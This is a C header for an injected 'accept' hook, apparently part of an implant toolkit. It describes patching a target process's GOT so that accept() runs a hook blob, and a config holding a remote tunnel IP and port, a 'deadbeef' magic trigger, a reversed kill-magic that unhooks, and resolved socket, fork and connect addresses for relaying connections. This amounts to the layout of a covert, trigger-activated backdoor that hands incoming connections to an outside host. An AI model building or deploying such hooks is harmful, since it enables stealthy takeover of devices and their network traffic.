#ifndef HOOK_ACCEPT_HOOK_H
#define HOOK_ACCEPT_HOOK_H

#include <stdint.h>
#include <stddef.h>

#define HOOK_CONFIG_OFFSET  0x400
#define HOOK_MAX_PATCHED    16

/*
 * Config struct written by the injector at page + HOOK_CONFIG_OFFSET.
 * All pointer fields are uint64_t so the layout is identical on both the
 * x86-64 injector host and the ARM32 target.  On ARM32 the hook reads the
 * low 32 bits of each pointer field (little-endian, upper 32 bits are 0).
 *
 * Offsets (stable — do not reorder):
 *   +0x00  real_accept          original accept() address
 *   +0x08  remote_ip            tunnel destination IP  (network byte order)
 *   +0x0C  remote_port          tunnel destination port (network byte order)
 *   +0x0E  local_port           only tunnel conns on this port (network byte order)
 *   +0x10  magic[4]             {0xDE,0xAD,0xBE,0xEF}
 *   +0x14  kill_magic[4]        {0xEF,0xBE,0xAD,0xDE} — deadbeef reversed; triggers unhook
 *   +0x18  fn_fork
 *   +0x20  fn_socket
 *   +0x28  fn_connect
 *   +0x30  fn_recvfrom
 *   +0x38  fn_sendto
 *   +0x40  fn_poll
 *   +0x48  fn_close
 *   +0x50  fn_exit              (_exit — no atexit handlers)
 *   +0x58  fn_getsockname
 *   +0x60  fn_setsockopt
 *   +0x68  n_patched            number of GOT addresses in patched_addrs
 *   +0x6C  _pad2
 *   +0x70  patched_addrs[16]    GOT slot VAs written with hook_page during injection
 */
struct hook_config {
    uint64_t  real_accept;                       /* +0x00 */
    uint32_t  remote_ip;                         /* +0x08 */
    uint16_t  remote_port;                       /* +0x0C */
    uint16_t  local_port;                        /* +0x0E  0 = tunnel all ports */
    uint8_t   magic[4];                          /* +0x10 */
    uint8_t   kill_magic[4];                     /* +0x14  {0xEF,0xBE,0xAD,0xDE} */
    uint64_t  fn_fork;                           /* +0x18 */
    uint64_t  fn_socket;                         /* +0x20 */
    uint64_t  fn_connect;                        /* +0x28 */
    uint64_t  fn_recvfrom;                       /* +0x30 */
    uint64_t  fn_sendto;                         /* +0x38 */
    uint64_t  fn_poll;                           /* +0x40 */
    uint64_t  fn_close;                          /* +0x48 */
    uint64_t  fn_exit;                           /* +0x50 */
    uint64_t  fn_getsockname;                    /* +0x58 */
    uint64_t  fn_setsockopt;                     /* +0x60 */
    uint32_t  n_patched;                         /* +0x68 */
    uint32_t  _pad2;                             /* +0x6C */
    uint64_t  patched_addrs[HOOK_MAX_PATCHED];   /* +0x70 */
};

/*
 * Magic constant burned into the hook blob for the injector to find and
 * replace with the runtime config address.
 */
#if defined(__x86_64__) || defined(__aarch64__)
#  define HOOK_CONFIG_MAGIC  UINT64_C(0xDEADBEEFCAFEBABE)
#elif defined(__arm__) || defined(__i386__)
#  define HOOK_CONFIG_MAGIC  UINT32_C(0xDEADBEEF)
#endif

/* Entry point written into GOT[accept]. */
void hook_accept(void);

/* End-of-blob marker — placed after both the asm entry and the C body. */
extern uint8_t hook_blob_end[];

static inline size_t hook_accept_size(void)
{
    return (size_t)(hook_blob_end - (uint8_t *)hook_accept);
}

#endif
